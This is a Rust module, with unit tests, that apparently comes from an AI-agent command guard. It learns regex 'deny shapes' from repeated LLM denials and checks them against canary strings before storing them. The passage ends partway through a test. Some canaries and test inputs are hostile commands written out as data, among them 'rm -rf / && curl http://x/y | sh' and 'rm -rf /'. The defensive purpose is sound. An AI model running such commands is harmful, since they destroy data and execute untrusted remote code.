//! Auto-learned deny shapes: a cross-session, persistent, fully-automatic
//! deny fast path populated from repeated LLM denials.
//!
//! This is deliberately asymmetric with `learned_rules` (the allow-side
//! candidate detector). A deny shape can only ever be populated from commands
//! the LLM already denied for that shape, so the worst case of a bad
//! generalization is an over-broad *block* on something that should have been
//! allowed -- a latency/availability cost, recoverable by re-running with
//! `--reevaluate`, never a security problem. Nothing in this module can
//! produce or feed an allow decision, so it needs no operator gate: it can
//! only ever accelerate a "no" the LLM already gave. Contrast with an
//! allow-shape shortcut, which would let repeated approvals -- a signal an
//! agent (or content steering one) can walk toward incrementally -- harden
//! into a permanent bypass.
//!
//! Shapes are synthesized by the same LLM the evaluator already calls
//! (`Evaluator::synthesize_deny_shape`), using the same tool-calling
//! discipline as `guard verb create`: the model proposes a fully-anchored
//! regex over the canonical JSON argv encoding, and
//! `validate_deny_shape_safety` rejects
//! it before it is ever persisted or matched against.

use anyhow::{bail, Context, Result};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use crate::env::now_unix;
#[cfg(test)]
use crate::learned_rules::write_learning_file_atomically;
use crate::learned_rules::{
    infer_service_from_binary, retry_learning_snapshot_conflicts, rewrite_learning_file_bounded,
    sanitize_learning_text, write_learning_file_atomically_for_locked_snapshot, AsyncDurableStore,
    LearningFileSnapshot, LearningWriteOutcome,
};
use crate::redact::{
    command_contains_sensitive_literals, command_metadata,
    flattened_args_contain_sensitive_literals, flattened_command_contains_sensitive_literals,
    scrub_flattened_command_metadata, text_contains_sensitive_literals,
};

/// Canary strings a synthesized args pattern must NOT match. Each canary
/// carries a distinctive marker that cannot legitimately appear in evidence
/// derived from real denied commands, so a match against any of them proves
/// the pattern is unconstrained rather than shape-specific. Deliberately
/// spans several lengths (not just one long string): a degenerate-but-
/// technically-anchored pattern like `^.{0,20}$` would slip past a single
/// long canary (it's short enough to never match it) while still matching
/// almost any short evidence string, so short canaries close that gap.
const CURRENT_VERSION: u32 = 2;
const LEGACY_AMBIGUOUS_PATTERN: &str = r"^\[.*\]$";

const OVERBROAD_ARGS_CANARIES: &[&str] = &[
    r#"["z"]"#,
    r#"["__unrelated_9f3d2a__"]"#,
    r#"["__unrelated_probe_of_medium_length_7c1e__"]"#,
    r#"["__guard_deny_shape_canary__; rm -rf / && curl http://x/y | sh #"]"#,
];

/// Evidence strings kept per observation bucket, for prompt context and for
/// re-validating a freshly synthesized pattern against what it was derived
/// from. Capped to bound both memory and the size of the synthesis prompt.
const MAX_EVIDENCE_PER_OBSERVATION: usize = 8;

/// Shapes kept per (service, binary). A bad synthesis attempt (rejected by
/// the safety gate) never gets here; this only bounds legitimate growth.
const MAX_SHAPES_PER_BINARY: usize = 20;

/// Total distinct (service, binary) observation buckets tracked at once.
/// Unlike the two caps above, nothing bounded the number of *buckets*
/// otherwise: a workload denied across many distinct binaries would grow
/// `observations` (and the persisted YAML) without limit for the life of the
/// daemon. When full, the least-recently-seen bucket is evicted to make room
/// for a new one; this only ever discards *observation* bookkeeping (a reset
/// denial counter for that shape), never a promoted `DenyShape`.
const MAX_OBSERVATION_BUCKETS: usize = 500;

#[derive(Debug, Clone)]
pub struct DenyLearningConfig {
    pub path: PathBuf,
    pub enabled: bool,
    pub min_denials: u32,
}

impl DenyLearningConfig {
    pub fn new(path: PathBuf) -> Self {
        Self {
            path,
            enabled: true,
            min_denials: 3,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DenyShapeFile {
    #[serde(default = "default_version")]
    pub version: u32,
    #[serde(default)]
    pub observations: BTreeMap<String, DenyObservation>,
    #[serde(default)]
    pub shapes: Vec<DenyShape>,
}

fn default_version() -> u32 {
    1
}

fn is_false(value: &bool) -> bool {
    !*value
}

impl Default for DenyShapeFile {
    fn default() -> Self {
        Self {
            version: CURRENT_VERSION,
            observations: BTreeMap::new(),
            shapes: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DenyObservation {
    pub service: String,
    pub binary: String,
    #[serde(default)]
    pub evidence_args: Vec<String>,
    pub denials: u32,
    pub first_seen_unix: u64,
    pub last_seen_unix: u64,
    pub last_command: String,
    pub last_reason: String,
    /// Denial count at which synthesis was last attempted, so a threshold
    /// crossing doesn't re-trigger the LLM on every subsequent denial.
    #[serde(default)]
    pub last_attempt_at_denials: u32,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DenyShape {
    pub service: String,
    pub binary: String,
    /// Fully anchored regex (`^...$`) over the canonical JSON argv array.
    pub args_pattern: String,
    /// A migrated legacy matcher whose original flattened argv was ambiguous.
    /// It conservatively denies the learned binary regardless of argv until an
    /// operator clears or replaces the historical learning state.
    #[serde(default, skip_serializing_if = "is_false")]
    pub legacy_ambiguous: bool,
    pub denials: u32,
    pub synthesized_at_unix: u64,
    pub updated_at_unix: u64,
    pub last_reason: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub evidence_args: Vec<String>,
    /// Delimiter-joined evidence retained only while loading the legacy format.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub evidence: String,
}

impl DenyShape {
    fn matches(&self, binary: &str, encoded_args: &str) -> bool {
        if !binary_matches(binary, &self.binary) {
            return false;
        }
        Regex::new(&self.args_pattern)
            .map(|re| re.is_match(encoded_args))
            .unwrap_or(false)
    }
}

/// Binary-name match consistent with `server::binary_allowed`: a path-qualified
/// binary (containing `/` or `\`) requires an exact match (so `/tmp/other/kubectl`
/// cannot fast-deny under a shape learned from bare `kubectl` denials, or vice
/// versa); a bare name matches case-insensitively by basename with a stripped
/// `.exe` suffix.
fn binary_matches(observed: &str, learned: &str) -> bool {
    if observed.contains('/')
        || observed.contains('\\')
        || learned.contains('/')
        || learned.contains('\\')
    {
        return observed == learned;
    }
    super::semantic_executable_key(observed) == super::semantic_executable_key(learned)
}

/// Outcome of recording one LLM denial. Mirrors `learned_rules::LearningOutcome`
/// in shape, but `ready_to_synthesize` drives automatic action (a synthesis
/// attempt), not an operator-facing notice.
#[derive(Debug, Clone)]
pub struct DenyLearningOutcome {
    pub service: String,
    pub binary: String,
    pub denials: u32,
    pub required_denials: u32,
    pub ready_to_synthesize: bool,
    pub evidence_args: Vec<String>,
    pub reason: String,
}

#[derive(Debug, Clone)]
pub struct DenyShapeStore {
    config: DenyLearningConfig,
    data: DenyShapeFile,
    snapshot: LearningFileSnapshot,
}

impl DenyShapeStore {
    pub fn load(config: DenyLearningConfig) -> Result<Self> {
        let path = config.path.clone();
        let (data, snapshot, warning) = rewrite_learning_file_bounded(&path, |snapshot| {
            let mut data = if let Some(content) = snapshot.content() {
                let content = std::str::from_utf8(content)
                    .with_context(|| format!("{} is not UTF-8", config.path.display()))?;
                if content.trim().is_empty() {
                    DenyShapeFile::default()
                } else {
                    serde_yaml_ng::from_str(content)
                        .with_context(|| format!("failed to parse {}", config.path.display()))?
                }
            } else {
                DenyShapeFile::default()
            };
            let original_observations = data.observations.len();
            let original_shapes = data.shapes.len();
            let stored_version = data.version;
            data.observations.retain(|_, observation| {
                !deny_observation_contains_sensitive_literals(observation, stored_version)
            });
            data.shapes
                .retain(|shape| !deny_shape_contains_sensitive_literals(shape, stored_version));
            let mut changed = original_observations != data.observations.len()
                || original_shapes != data.shapes.len();
            if data.version > CURRENT_VERSION {
                bail!(
                    "deny-shape schema version {} is newer than supported version {}",
                    data.version,
                    CURRENT_VERSION
                );
            }
            if data.version < CURRENT_VERSION {
                // Historical regexes were learned over space-joined argv and
                // cannot be translated without inventing token boundaries.
                // Preserve their deny-only authority conservatively as a
                // binary-wide quarantine, and discard ambiguous observations
                // so future synthesis starts from structured evidence.
                data.observations.clear();
                for shape in &mut data.shapes {
                    shape.args_pattern = LEGACY_AMBIGUOUS_PATTERN.to_string();
                    shape.legacy_ambiguous = true;
                    shape.evidence_args.clear();
                    shape.evidence.clear();
                }
                data.version = CURRENT_VERSION;
                changed = true;
            }
            for observation in data.observations.values_mut() {
                let metadata = scrub_flattened_command_metadata(&observation.last_command);
                changed |= metadata != observation.last_command;
                observation.last_command = metadata;
            }
            for observation in data.observations.values_mut() {
                let sanitized = sanitize_learning_text(&observation.last_reason);
                changed |= sanitized != observation.last_reason;
                observation.last_reason = sanitized;
            }
            for shape in &mut data.shapes {
                let sanitized = sanitize_learning_text(&shape.last_reason);
                changed |= sanitized != shape.last_reason;
                shape.last_reason = sanitized;
                if shape.evidence_args.is_empty() && !shape.evidence.is_empty() {
                    shape.evidence_args = shape.evidence.split(" | ").map(str::to_string).collect();
                    shape.evidence.clear();
                    changed = true;
                }
            }
            let content = changed
                .then(|| serde_yaml_ng::to_string(&data))
                .transpose()?;
            Ok((content, data))
        })?;
        if let Some(error) = warning {
            tracing::warn!("deny-shape cleanup committed with a durability warning: {error}");
        }
        Ok(Self {
            config,
            data,
            snapshot,
        })
    }

    pub fn path(&self) -> &Path {
        &self.config.path
    }

    pub fn enabled(&self) -> bool {
        self.config.enabled
    }

    pub fn min_denials(&self) -> u32 {
        self.config.min_denials
    }

    pub fn shape_count(&self) -> usize {
        self.data.shapes.len()
    }

    pub fn observation_count(&self) -> usize {
        self.data.observations.len()
    }

    pub(crate) fn refreshed_copy(&self) -> Result<Self> {
        Self::load(self.config.clone())
    }

    /// Fast-path lookup: does an already-synthesized shape cover this
    /// binary/argv? The matcher serializes argv itself so callers cannot
    /// collapse or reinterpret element boundaries.
    ///
    /// Deliberately unconditional: this does not check `self.config.enabled`.
    /// `enabled` only gates whether new shapes get learned (`record_denial`);
    /// a daemon that wants `--no-learn-deny` to also stop enforcing shapes
    /// already on disk must not construct a `DenyShapeStore` for the
    /// evaluator at all (see `main.rs`, which only calls `EvalConfig::deny_shapes`
    /// when the flag is on).
    pub fn matches(&self, binary: &str, args: &[String]) -> Option<&DenyShape> {
        let encoded_args = canonical_argv(args);
        self.data
            .shapes
            .iter()
            .find(|shape| shape.matches(binary, &encoded_args))
    }

    /// Bookkeeping only: record one LLM denial and report whether this bucket
    /// just became (re-)eligible for a synthesis attempt. Never grants or
    /// matches anything itself -- see `matches` and `promote_shape`.
    pub fn record_denial(
        &mut self,
        binary: &str,
        args: &[String],
        command: &str,
        reason: &str,
    ) -> Result<Option<DenyLearningOutcome>> {
        let config = self.config.clone();
        let mut first = Some(self.clone());
        let (current, outcome) = retry_learning_snapshot_conflicts(|| {
            let mut current = match first.take() {
                Some(current) => current,
                None => Self::load(config.clone())?,
            };
            let mut candidate = current.clone();
            let outcome = candidate.record_denial_in_memory(binary, args, command, reason)?;
            current.commit_candidate(candidate.data)?;
            Ok((current, outcome))
        })?;
        *self = current;
        Ok(outcome)
    }

    fn record_denial_in_memory(
        &mut self,
        binary: &str,
        args: &[String],
        _command: &str,
        reason: &str,
    ) -> Result<Option<DenyLearningOutcome>> {
        if command_contains_sensitive_literals(binary, args) {
            return Ok(None);
        }
        let metadata = command_metadata(binary, args);
        if !self.config.enabled {
            return Ok(None);
        }
        let service = infer_service_from_binary(binary);
        let reason = sanitize_learning_text(reason);
        let encoded_args = canonical_argv(args);
        let now = now_unix();
        let key = format!("{service}|{binary}");
        if !self.data.observations.contains_key(&key)
            && self.data.observations.len() >= MAX_OBSERVATION_BUCKETS
        {
            if let Some(oldest_key) = self
                .data
                .observations
                .iter()
                .min_by_key(|(_, obs)| obs.last_seen_unix)
                .map(|(k, _)| k.clone())
            {
                self.data.observations.remove(&oldest_key);
            }
        }
        let observation = self
            .data
            .observations
            .entry(key)
            .or_insert_with(|| DenyObservation {
                service: service.clone(),
                binary: binary.to_string(),
                evidence_args: Vec::new(),
                denials: 0,
                first_seen_unix: now,
                last_seen_unix: now,
                last_command: metadata.clone(),
                last_reason: reason.clone(),
                last_attempt_at_denials: 0,
            });

        observation.denials = observation.denials.saturating_add(1);
        observation.last_seen_unix = now;
        observation.last_command = metadata;
        observation.last_reason = reason.clone();
        if !observation.evidence_args.contains(&encoded_args)
            && observation.evidence_args.len() < MAX_EVIDENCE_PER_OBSERVATION
        {
            observation.evidence_args.push(encoded_args);
        }

        let denials = observation.denials;
        let min_denials = self.config.min_denials;
        // Attempt synthesis on the crossing, then again every `min_denials`
        // denials after that (a first attempt can fail or come back
        // unconfident; don't hammer the LLM on every single subsequent
        // denial once the threshold is already crossed).
        let ready_to_synthesize = denials >= min_denials
            && (denials - min_denials).is_multiple_of(min_denials.max(1))
            && observation.last_attempt_at_denials != denials;
        if ready_to_synthesize {
            observation.last_attempt_at_denials = denials;
        }
        let evidence_args = observation.evidence_args.clone();

        Ok(Some(DenyLearningOutcome {
            service,
            binary: binary.to_string(),
            denials,
            required_denials: min_denials,
            ready_to_synthesize,
            evidence_args,
            reason,
        }))
    }

    /// Validate and persist a model-proposed shape. The caller (the
    /// evaluator's `synthesize_deny_shape`) has already made the LLM call;
    /// this is the only place a shape becomes matchable, and it re-derives
    /// every safety property from scratch rather than trusting the model.
    pub fn promote_shape(
        &mut self,
        service: &str,
        binary: &str,
        args_pattern: &str,
        evidence: &[String],
        reason: &str,
        denials: u32,
    ) -> Result<()> {
        if evidence
            .iter()
            .any(|args| canonical_args_contain_sensitive_literals(binary, args))
        {
            bail!("deny shape evidence contains literal credential material");
        }
        if text_contains_sensitive_literals(args_pattern) {
            bail!("deny shape args pattern contains literal credential material");
        }
        validate_deny_shape_safety(args_pattern, evidence)?;
        let reason = sanitize_learning_text(reason);
        let mut candidate = self.data.clone();
        let now = now_unix();
        if let Some(existing) = candidate
            .shapes
            .iter_mut()
            .find(|s| s.binary.eq_ignore_ascii_case(binary) && s.args_pattern == args_pattern)
        {
            existing.denials = denials;
            existing.updated_at_unix = now;
            existing.last_reason = reason.clone();
            existing.evidence_args = evidence.to_vec();
            existing.evidence.clear();
        } else {
            let per_binary = candidate
                .shapes
                .iter()
                .filter(|s| s.binary.eq_ignore_ascii_case(binary))
                .count();
            if per_binary >= MAX_SHAPES_PER_BINARY {
                bail!(
                    "already have {} auto-learned deny shapes for binary '{}'; refusing to add more \
                     (an operator-authored deny in policy.yaml scales better than more shapes)",
                    MAX_SHAPES_PER_BINARY,
                    binary
                );
            }
            candidate.shapes.push(DenyShape {
                service: service.to_string(),
                binary: binary.to_string(),
                args_pattern: args_pattern.to_string(),
                legacy_ambiguous: false,
                denials,
                synthesized_at_unix: now,
                updated_at_unix: now,
                last_reason: reason,
                evidence_args: evidence.to_vec(),
                evidence: String::new(),
            });
        }
        self.commit_candidate(candidate)
    }

    fn commit_candidate(&mut self, candidate: DenyShapeFile) -> Result<()> {
        if candidate == self.data {
            return Ok(());
        }
        let outcome = self.save_data(&candidate)?;
        let (committed, warning) = outcome.into_parts();
        self.data = candidate;
        self.snapshot = committed;
        if let Some(error) = warning {
            tracing::warn!(
                "deny-shape replacement committed with a durability warning: {}",
                error
            );
        }
        Ok(())
    }

    fn save_data(&self, data: &DenyShapeFile) -> Result<LearningWriteOutcome> {
        let content = self.canonical_content(data)?;
        write_learning_file_atomically_for_locked_snapshot(
            &self.config.path,
            &self.snapshot,
            &content,
        )
    }

    fn canonical_content(&self, data: &DenyShapeFile) -> Result<String> {
        let mut data = data.clone();
        for observation in data.observations.values_mut() {
            observation.last_reason = sanitize_learning_text(&observation.last_reason);
            observation.last_command = scrub_flattened_command_metadata(&observation.last_command);
        }
        for shape in &mut data.shapes {
            shape.last_reason = sanitize_learning_text(&shape.last_reason);
        }
        Ok(serde_yaml_ng::to_string(&data)?)
    }
}

fn deny_observation_contains_sensitive_literals(
    observation: &DenyObservation,
    version: u32,
) -> bool {
    observation.evidence_args.iter().any(|args| {
        if version >= CURRENT_VERSION {
            canonical_args_contain_sensitive_literals(&observation.binary, args)
        } else {
            flattened_args_contain_sensitive_literals(&observation.binary, args)
        }
    }) || flattened_command_contains_sensitive_literals(&observation.last_command)
}

fn deny_shape_contains_sensitive_literals(shape: &DenyShape, version: u32) -> bool {
    text_contains_sensitive_literals(&shape.args_pattern)
        || shape.evidence_args.iter().any(|args| {
            if version >= CURRENT_VERSION {
                canonical_args_contain_sensitive_literals(&shape.binary, args)
            } else {
                flattened_args_contain_sensitive_literals(&shape.binary, args)
            }
        })
        || (!shape.evidence.is_empty()
            && (flattened_args_contain_sensitive_literals(&shape.binary, &shape.evidence)
                || shape
                    .evidence
                    .split(" | ")
                    .any(|args| flattened_args_contain_sensitive_literals(&shape.binary, args))))
}

fn canonical_args_contain_sensitive_literals(binary: &str, encoded: &str) -> bool {
    serde_json::from_str::<Vec<String>>(encoded)
        .map(|args| command_contains_sensitive_literals(binary, &args))
        .unwrap_or(true)
}

/// Collision-free persisted identity for one argv vector. JSON string escaping
/// keeps element boundaries and control characters explicit and deterministic.
pub fn canonical_argv(args: &[String]) -> String {
    serde_json::to_string(args).expect("argv serialization cannot fail")
}

/// Reject a synthesized args pattern that isn't anchored, doesn't compile,
/// doesn't match its own evidence, or is loose enough to match content
/// shaped like a chained shell command regardless of the shape it claims to
/// represent.
pub fn validate_deny_shape_safety(args_pattern: &str, evidence: &[String]) -> Result<()> {
    if text_contains_sensitive_literals(args_pattern) {
        bail!("deny shape args pattern contains literal credential material");
    }
    if !args_pattern.starts_with('^') || !args_pattern.ends_with('$') {
        bail!(
            "deny shape args pattern {:?} must be fully anchored (^...$)",
            args_pattern
        );
    }
    let re = Regex::new(args_pattern).with_context(|| {
        format!(
            "deny shape args pattern {:?} does not compile",
            args_pattern
        )
    })?;
    if let Some(canary) = OVERBROAD_ARGS_CANARIES.iter().find(|c| re.is_match(c)) {
        bail!(
            "deny shape args pattern {:?} is too permissive (it matches unrelated content {:?}); \
             refusing to auto-synthesize",
            args_pattern,
            canary
        );
    }
    for ev in evidence {
        if !re.is_match(ev) {
            bail!(
                "deny shape args pattern {:?} does not match its own evidence {:?}; refusing to \
                 auto-synthesize",
                args_pattern,
                ev
            );
        }
    }
    Ok(())
}

impl AsyncDurableStore for DenyShapeStore {
    fn authority_name(&self) -> &'static str {
        "deny-shape"
    }

    fn durable_path(&self) -> Option<&Path> {
        Some(&self.config.path)
    }

    fn same_durable_snapshot(&self, snapshot: &LearningFileSnapshot) -> bool {
        self.snapshot.same_authority(snapshot)
    }

    fn same_in_memory_epoch(&self, other: &Self) -> bool {
        self.snapshot.same_authority(&other.snapshot) && self.data == other.data
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(words: &[&str]) -> Vec<String> {
        words.iter().map(|word| (*word).to_string()).collect()
    }

    fn encoded(words: &[&str]) -> String {
        canonical_argv(&argv(words))
    }

    fn exact_pattern(words: &[&str]) -> String {
        format!("^{}$", regex::escape(&encoded(words)))
    }

    fn config(path: PathBuf, min_denials: u32) -> DenyLearningConfig {
        DenyLearningConfig {
            path,
            enabled: true,
            min_denials,
        }
    }

    #[test]
    fn delayed_refresh_cannot_replace_a_newer_deny_epoch() {
        let temp = crate::learned_rules::authority_tempdir();
        let config = config(temp.path().join("deny.yaml"), 1);
        let baseline = DenyShapeStore::load(config).unwrap();
        let delayed_refresh = baseline.clone();
        let mut current = baseline.clone();
        current
            .record_denial(
                "fixturectl",
                &["remove".to_string(), "object".to_string()],
                "fixturectl remove object",
                "unsafe",
            )
            .unwrap();

        assert!(current
            .adopt_async_result(&baseline, delayed_refresh)
            .is_err());
        assert_eq!(current.observation_count(), 1);
    }

    #[test]
    fn repeated_denials_become_ready_to_synthesize_once() {
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let args = vec!["delete".into(), "namespace".into(), "prod".into()];

        let first = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(!first.ready_to_synthesize);

        let second = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(second.ready_to_synthesize);

        // A third denial before the next multiple of min_denials should not
        // re-trigger synthesis.
        let third = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(!third.ready_to_synthesize);

        // The fourth denial (min_denials=2) is the next actual multiple and
        // should re-trigger synthesis: an unconfident/failed first attempt
        // must not permanently disable a shape from ever being retried.
        let fourth = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(fourth.ready_to_synthesize);
    }

    #[test]
    fn failed_deny_shape_write_keeps_memory_and_durable_state_unchanged() {
        let temp = crate::learned_rules::authority_tempdir();
        let path = temp.path().join("deny.yaml");
        let mut store = DenyShapeStore::load(config(path.clone(), 2)).unwrap();
        let command_args = vec!["delete".to_string(), "pod".to_string()];
        store
            .record_denial("kubectl", &command_args, "kubectl delete pod", "denied")
            .unwrap();
        let before_memory = store.data.clone();
        let before_file = std::fs::read(&path).unwrap();
        let blocker = temp.path().join("blocker");
        crate::learned_rules::write_authority_file(&blocker, "not a directory").unwrap();
        store.config.path = blocker.join("deny.yaml");

        assert!(store
            .record_denial("kubectl", &command_args, "kubectl delete pod", "denied")
            .is_err());
        assert_eq!(store.data, before_memory);
        assert_eq!(std::fs::read(path).unwrap(), before_file);
    }

    #[test]
    fn sensitive_deny_records_are_rejected_and_purged_idempotently() {
        let temp = crate::learned_rules::authority_tempdir();
        let path = temp.path().join("deny.yaml");
        let config = config(path.clone(), 1);
        let mut store = DenyShapeStore::load(config.clone()).unwrap();
        let safe_args = vec!["delete".to_string(), "pod".to_string()];
        store
            .record_denial("kubectl", &safe_args, "kubectl delete pod", "denied")
            .unwrap();
        assert!(store
            .data
            .observations
            .values()
            .all(|observation| observation.last_command.contains("[argv-sha256:")));
        store
            .promote_shape(
                "kubernetes",
                "kubectl",
                &exact_pattern(&["delete", "pod"]),
                &[encoded(&["delete", "pod"])],
                "denied",
                1,
            )
            .unwrap();
        let safe_bytes = std::fs::read(&path).unwrap();
        let value = ["q", "7"].concat();
        assert!(store
            .record_denial(
                "docker",
                &["login".to_string(), "-p".to_string(), value.clone()],
                &format!("docker login -p {value}"),
                "ignored",
            )
            .unwrap()
            .is_none());
        assert_eq!(std::fs::read(&path).unwrap(), safe_bytes);
        assert!(store
            .promote_shape(
                "container",
                "docker",
                ".*",
                &[format!("login -p {value}")],
                "ignored",
                1,
            )
            .is_err());

        let mut contaminated = store.data.clone();
        contaminated
            .observations
            .values_mut()
            .for_each(|observation| observation.last_command = "kubectl delete pod".to_string());
        let mut observation = contaminated.observations.values().next().unwrap().clone();
        observation.binary = "docker".to_string();
        observation.evidence_args = vec![format!("login -p {value}")];
        observation.last_command = format!("docker login -p {value}");
        contaminated
            .observations
            .insert("sensitive".to_string(), observation);
        let mut shape = contaminated.shapes[0].clone();
        shape.binary = "docker".to_string();
        shape.evidence = format!("login --password={value}");
        contaminated.shapes.push(shape);
        write_learning_file_atomically(&path, &serde_yaml_ng::to_string(&contaminated).unwrap())
            .unwrap();

        let loaded = DenyShapeStore::load(config.clone()).unwrap();
        assert_eq!(loaded.data.observations.len(), 1);
        assert_eq!(loaded.data.shapes.len(), 1);
        assert!(loaded
            .data
            .observations
            .values()
            .all(|observation| observation
                .last_command
                .starts_with("[legacy-command-sha256:")));
        let sanitized = std::fs::read(&path).unwrap();
        assert!(!sanitized
            .windows(value.len())
            .any(|window| window == value.as_bytes()));
        DenyShapeStore::load(config).unwrap();
        assert_eq!(std::fs::read(&path).unwrap(), sanitized);
    }

    #[test]
    fn deny_shape_regex_and_legacy_delimiter_evidence_fail_closed() {
        let temp = crate::learned_rules::authority_tempdir();
        let path = temp.path().join("deny.yaml");
        let config = config(path.clone(), 1);
        let mut store = DenyShapeStore::load(config.clone()).unwrap();
        store
            .promote_shape(
                "kubernetes",
                "kubectl",
                &exact_pattern(&["delete", "pod"]),
                &[encoded(&["delete", "pod"])],
                "safe",
                1,
            )
            .unwrap();
        let value = ["q", "7"].concat();
        let contaminated_pattern = format!("^(?:password={value})?delete pod$");
        assert!(store
            .promote_shape(
                "kubernetes",
                "kubectl",
                &contaminated_pattern,
                &[encoded(&["delete", "pod"])],
                "ignored",
                1,
            )
            .is_err());

        let mut contaminated = store.data.clone();
        let mut regex_shape = contaminated.shapes[0].clone();
        regex_shape.args_pattern = contaminated_pattern;
        contaminated.shapes.push(regex_shape);
        let mut delimiter_shape = contaminated.shapes[0].clone();
        delimiter_shape.binary = "docker".to_string();
        delimiter_shape.evidence_args.clear();
        delimiter_shape.evidence = "login -p | | ordinary".to_string();
        contaminated.shapes.push(delimiter_shape);
        write_learning_file_atomically(&path, &serde_yaml_ng::to_string(&contaminated).unwrap())
            .unwrap();

        let loaded = DenyShapeStore::load(config.clone()).unwrap();
        assert_eq!(loaded.shape_count(), 1);
        let sanitized = std::fs::read(&path).unwrap();
        assert!(!sanitized
            .windows(value.len())
            .any(|window| window == value.as_bytes()));
        DenyShapeStore::load(config).unwrap();
        assert_eq!(std::fs::read(&path).unwrap(), sanitized);
    }

    #[test]
    fn deny_learning_prose_is_sanitized_without_changing_shape_authority() {
        let temp = crate::learned_rules::authority_tempdir();
        let path = temp.path().join("deny.yaml");
        let config = config(path.clone(), 1);
        let value = ["q", "7"].concat();
        let reason = format!("password={value}");
        let mut store = DenyShapeStore::load(config.clone()).unwrap();
        store
            .record_denial(
                "kubectl",
                &["delete".to_string(), "pod".to_string()],
                "kubectl delete pod",
                &reason,
            )
            .unwrap();
        store
            .promote_shape(
                "kubernetes",
                "kubectl",
                &exact_pattern(&["delete", "pod"]),
                &[encoded(&["delete", "pod"])],
                &reason,
                1,
            )
            .unwrap();
        let expected_pattern = store.data.shapes[0].args_pattern.clone();
        assert!(!std::fs::read(&path)
            .unwrap()
            .windows(value.len())
            .any(|window| window == value.as_bytes()));

        let mut contaminated = store.data.clone();
        contaminated
            .observations
            .values_mut()
            .for_each(|observation| observation.last_reason = reason.clone());
        contaminated.shapes[0].last_reason = reason;
        write_learning_file_atomically(&path, &serde_yaml_ng::to_string(&contaminated).unwrap())
            .unwrap();
        let loaded = DenyShapeStore::load(config.clone()).unwrap();
        assert_eq!(loaded.data.shapes[0].args_pattern, expected_pattern);
        let sanitized = std::fs::read(&path).unwrap();
        assert!(!sanitized
            .windows(value.len())
            .any(|window| window == value.as_bytes()));
        DenyShapeStore::load(config).unwrap();
        assert_eq!(std::fs::read(&path).unwrap(), sanitized);
    }

    #[test]
    fn disabled_store_records_nothing() {
        let temp = crate::learned_rules::authority_tempdir();
        let mut cfg = config(temp.path().join("deny.yaml"), 1);
        cfg.enabled = false;
        let mut store = DenyShapeStore::load(cfg).unwrap();
        let result = store
            .record_denial("rm", &["-rf".into(), "/".into()], "rm -rf /", "bad")
            .unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn promoted_shape_matches_binary_and_args() {
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        store
            .promote_shape(
                "kubectl",
                "kubectl",
                r#"^\["delete","namespace","[^"]+"\]$"#,
                &[encoded(&["delete", "namespace", "prod"])],
                "namespace deletion is destructive",
                2,
            )
            .unwrap();

        assert!(store
            .matches("kubectl", &argv(&["delete", "namespace", "prod"]))
            .is_some());
        assert!(store
            .matches("kubectl", &argv(&["delete", "namespace", "staging"]))
            .is_some());
        assert!(store.matches("kubectl", &argv(&["get", "pods"])).is_none());
        assert!(store
            .matches("helm", &argv(&["delete", "namespace", "prod"]))
            .is_none());
    }

    #[test]
    fn matches_rejects_path_qualified_spoof_like_binary_allowed_does() {
        // Consistent with server::binary_allowed: a shape learned against the
        // bare binary name must not match a binary reached via a different,
        // path-qualified location, and vice versa -- deny-only, so this isn't
        // a bypass that could be misused, but it should behave the same way
        // the codebase's other binary matching does.
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        store
            .promote_shape(
                "kubectl",
                "kubectl",
                r#"^\["delete","namespace","[^"]+"\]$"#,
                &[encoded(&["delete", "namespace", "prod"])],
                "namespace deletion is destructive",
                2,
            )
            .unwrap();

        assert!(store
            .matches("kubectl", &argv(&["delete", "namespace", "prod"]))
            .is_some());
        assert!(store
            .matches("/tmp/evil/kubectl", &argv(&["delete", "namespace", "prod"]),)
            .is_none());
        assert!(store
            .matches("KUBECTL.EXE", &argv(&["delete", "namespace", "prod"]),)
            .is_some());
        assert!(store
            .matches("Kubectl.ExE", &argv(&["delete", "namespace", "prod"]),)
            .is_some());
    }

    #[test]
    fn promote_shape_rejects_degenerate_short_wildcard_pattern() {
        // A pattern like `^.{0,20}$` is anchored, compiles, and (being short)
        // never matches the long shell-command-chain canary -- but it would
        // still match almost any short evidence string. Multiple canary
        // lengths close this gap.
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"^.{0,20}$",
                &[encoded(&["delete", "ns", "prod"])],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("too permissive"));
    }

    #[test]
    fn promote_shape_rejects_unanchored_pattern() {
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"delete namespace \S+",
                &[encoded(&["delete", "namespace", "prod"])],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("anchored"));
    }

    #[test]
    fn promote_shape_rejects_overbroad_pattern() {
        let temp = crate::learned_rules::authority_tempdir();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
